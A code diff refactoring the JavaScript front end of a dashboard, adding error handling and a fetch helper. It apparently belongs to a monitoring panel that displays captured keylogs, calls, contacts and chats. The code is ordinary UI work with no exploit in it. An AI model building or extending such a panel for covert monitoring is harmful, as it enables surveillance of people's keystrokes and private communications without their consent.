@@ -27,82 +27,115 @@ function initializeApp() {
 
 // Show section
 function showSection(sectionId) {
-    // Hide all sections
-    document.querySelectorAll('.section').forEach(section => {
-        section.classList.add('hidden');
-        section.classList.remove('active');
-    });
-    
-    // Show selected section
-    const section = document.getElementById(sectionId);
-    if (section) {
-        section.classList.remove('hidden');
-        section.classList.add('active');
+    try {
+        // Hide all sections
+        document.querySelectorAll('.section').forEach(section => {
+            section.classList.add('hidden');
+            section.classList.remove('active');
+        });
+        
+        // Show selected section
+        const section = document.getElementById(sectionId);
+        if (section) {
+            section.classList.remove('hidden');
+            section.classList.add('active');
+            // Load section specific data
+            loadSectionData(sectionId);
+        } else {
+            console.warn(`Section with id "${sectionId}" not found`);
+        }
+    } catch (error) {
+        console.error('Error showing section:', error);
     }
-
-    // Load section specific data
-    loadSectionData(sectionId);
 }
 
 // Load section data
 async function loadSectionData(sectionId) {
-    switch(sectionId) {
-        case 'calls':
-            await loadCalls();
-            break;
-        case 'archived':
-            await loadArchived();
-            break;
-        case 'keylogs':
-            await loadKeylogs();
-            break;
-        case 'contacts':
-            await loadContacts();
-            break;
-        case 'chats':
-            await loadChats();
-            break;
+    try {
+        const contentDiv = document.querySelector('.main-content');
+        if (!contentDiv) {
+            console.error('Main content container not found');
+            return;
+        }
+
+        switch(sectionId) {
+            case 'calls':
+                contentDiv.innerHTML = '<div id="calls" class="section"></div>';
+                await loadCalls();
+                break;
+            case 'keylogs':
+                contentDiv.innerHTML = '<div id="keylogs" class="section"></div>';
+                await loadKeylogs();
+                break;
+            case 'contacts':
+                contentDiv.innerHTML = '<div id="contacts" class="section"></div>';
+                await loadContacts();
+                break;
+            case 'chats':
+                contentDiv.innerHTML = '<div id="chats" class="section"></div>';
+                await loadChats();
+                break;
+            default:
+                console.warn(`Unknown section: ${sectionId}`);
+                break;
+        }
+    } catch (error) {
+        console.error('Error loading section data:', error);
+    }
+}
+
+// Generic fetch helper with error handling
+async function fetchContent(url) {
+    try {
+        const response = await fetch(url);
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        return await response.text();
+    } catch (error) {
+        console.error(`Error fetching ${url}:`, error);
+        return `<p class="error-message">Error loading content. Please try again later.</p>`;
     }
 }
 
 // Load calls
 async function loadCalls() {
-    const response = await fetch('/calls');
-    const data = await response.text();
-    document.getElementById('calls').innerHTML = data;
-    feather.replace();
-}
-
-// Load archived
-async function loadArchived() {
-    const response = await fetch('/archived');
-    const data = await response.text();
-    document.getElementById('archived').innerHTML = data;
-    feather.replace();
+    const callsSection = document.getElementById('calls');
+    if (callsSection) {
+        const data = await fetchContent('/calls');
+        callsSection.innerHTML = data;
+        feather.replace();
+    }
 }
 
 // Load keylogs
 async function loadKeylogs() {
-    const response = await fetch('/keylogs');
-    const data = await response.text();
-    document.getElementById('keylogs').innerHTML = data;
-    feather.replace();
+    const keylogsSection = document.getElementById('keylogs');
+    if (keylogsSection) {
+        const data = await fetchContent('/keylogs');
+        keylogsSection.innerHTML = data;
+        feather.replace();
+    }
 }
 
 // Load contacts
 async function loadContacts() {
-    const response = await fetch('/contacts');
-    const data = await response.text();
-    document.getElementById('contacts').innerHTML = data;
-    feather.replace();
+    const contactsSection = document.getElementById('contacts');
+    if (contactsSection) {
+        const data = await fetchContent('/contacts');
+        contactsSection.innerHTML = data;
+        feather.replace();
+    }
 }
 
 // Load chats
 async function loadChats() {
-    const response = await fetch('/');
-    const data = await response.text();
-    document.getElementById('chats').innerHTML = data;
-    feather.replace();
+    const chatsSection = document.getElementById('chats');
+    if (chatsSection) {
+        const data = await fetchContent('/');
+        chatsSection.innerHTML = data;
+        feather.replace();
+    }
 }
 
 // Search messages
